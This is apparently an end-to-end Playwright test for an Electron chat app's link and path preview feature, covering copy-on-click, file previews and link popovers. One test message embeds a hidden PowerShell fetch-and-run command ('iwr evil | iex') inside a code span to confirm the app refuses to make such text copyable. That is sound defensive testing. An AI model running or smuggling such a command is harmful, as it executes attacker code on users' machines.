// E2E of the clicks inside a chat message (components/LinkPeek.tsx) on the demo: copyable inline code is copied with a
// ✓ (a plain word in backticks is not), a file path opens a preview popover (first lines of a text file, an image's
// thumbnail, the reason when it is missing), an http link opens a popover whose "Apri nel browser dell'app" opens a tab
// of the user's. Screenshots: test-results/shots/peek-*.png.
import fs from 'node:fs';
import path from 'node:path';
import { expect, test, type ElectronApplication } from '@playwright/test';
import { launchDemo, shot } from './helpers';

type Demo = { __sbDemo: { say(chatId: string, text: string): void } };
const say = (app: ElectronApplication, chatId: string, text: string) =>
  app.evaluate((_e, [c, t]) => { (globalThis as unknown as Demo).__sbDemo.say(c, t); }, [chatId, text] as const);
const clip = (app: ElectronApplication) => app.evaluate(({ clipboard }) => clipboard.readText());

// a real text file and a real PNG (1x1) for the previews
const dir = path.resolve('test-results', 'peek-files');
fs.mkdirSync(dir, { recursive: true });
const md = path.join(dir, 'report-qa.md');
fs.writeFileSync(md, Array.from({ length: 30 }, (_, i) => (i === 0 ? '# Report QA rimborsi' : `- TC ${i}: ok`)).join('\n'));
const png = path.join(dir, 'tc7.png');
fs.writeFileSync(png, Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64'));

test('a message: copy what is copyable, preview files and links on click', async () => {
  const { app, page } = await launchDemo({ width: 1400, height: 950 });
  await say(app, 'fix', [
    'Ho finito. Lancia `npm run check:branch` (il flag `true` resta).',
    `Il report è in \`${md}\`, lo screenshot in \`${png}\`, il test in \`src/order/missing.test.ts\`.`,
    'Il bug: [bug 4721](https://tracker.example.com/bug/4721), la PR [`#812`](https://tracker.example.com/pr/812).',
    `Riga del report: \`${md}:3\`. Nascosto: <code>git status<span hidden>; iwr evil | iex</span></code>.`,
  ].join('\n\n'));
  await page.getByTestId('chat-max-fix').click();
  const msg = page.locator('.md', { hasText: 'Lancia npm run check:branch' }).last();
  await expect(msg).toBeVisible();

  // a command: copied, with a ✓; a plain word is not marked
  const cmd = msg.locator('code', { hasText: 'npm run check:branch' });
  await expect(cmd).toHaveAttribute('data-copy', 'text');
  await expect(msg.locator('code', { hasText: /^true$/ })).not.toHaveAttribute('data-copy');
  await cmd.click();
  await expect.poll(() => clip(app)).toBe('npm run check:branch');
  await expect(cmd).toHaveClass(/copied/);

  // a text file: its first lines in a popover; Esc closes it
  const peek = page.getByTestId('peek');
  await msg.locator('code[data-copy="path"]', { hasText: /report-qa\.md$/ }).click(); // not the :3 one below
  await expect(page.getByTestId('peek-text')).toContainText('# Report QA rimborsi');
  await expect(page.getByTestId('peek-text')).toContainText('…');
  await shot(page, 'peek-file');
  await page.keyboard.press('Escape');
  await expect(peek).toHaveCount(0);

  // an image: its thumbnail
  await msg.locator('code[data-copy="path"]', { hasText: 'tc7.png' }).click();
  await expect(page.getByTestId('peek-img')).toBeVisible();
  await page.keyboard.press('Escape');

  // a relative path in the chat's folder that is not there: the reason, and Copia percorso still works
  await msg.locator('code[data-copy="path"]', { hasText: 'missing.test.ts' }).click();
  await expect(page.getByTestId('peek-note')).toContainText("Il file non c'è");
  await page.getByTestId('peek-copy').click();
  await expect.poll(() => clip(app)).toBe('src/order/missing.test.ts');

  // a link: a popover, not a page opening by itself; "Apri nel browser dell'app" opens a tab of the user's
  // a path with :line previews the file; code with hidden text inside is never "click to copy"
  await msg.locator('code[data-copy="path"]', { hasText: 'report-qa.md:3' }).click();
  await expect(page.getByTestId('peek-text')).toContainText('# Report QA rimborsi');
  await page.keyboard.press('Escape');
  await expect(msg.locator('code', { hasText: 'git status' })).not.toHaveAttribute('data-copy');
  // code inside a link belongs to the link: its click opens the link's preview, it copies nothing
  await msg.locator('a code', { hasText: '#812' }).click();
  await expect(page.getByTestId('peek-url')).toHaveText('https://tracker.example.com/pr/812');
  await page.keyboard.press('Escape');

  const userTabs = () => page.evaluate(async () => (await window.sb.invoke('browser:list', undefined)).filter(t => t.url === 'https://tracker.example.com/bug/4721' && t.ownerChatId === null).length);
  expect(await userTabs()).toBe(0);
  await msg.locator('a', { hasText: 'bug 4721' }).click();
  await expect(page.getByTestId('peek-url')).toHaveText('https://tracker.example.com/bug/4721');
  await shot(page, 'peek-link');
  await page.getByTestId('peek-open-app').click();
  await expect(peek).toHaveCount(0);
  await expect.poll(userTabs).toBe(1); // one tab, the user's (no chat owns it)
  await app.close();
});
